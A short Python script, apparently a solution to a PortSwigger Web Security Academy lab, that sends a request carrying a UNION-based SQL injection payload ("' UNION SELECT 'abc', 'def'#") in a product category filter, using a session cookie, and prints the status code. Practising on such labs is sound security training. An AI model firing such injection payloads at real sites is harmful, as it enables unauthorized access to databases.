import requests

headers = {
    "Cookie": "session=DtKmMW3aPljsb7FGSpMyOodn3VGZU24j"
}
url = "https://0a10005803118066842edca000370019.web-security-academy.net/filter?category=Gifts' UNION SELECT 'abc' , 'def'#"

r = requests.get(url=url,headers=headers)

print(f"""STATUS CODE : {r.status_code}
      """)

    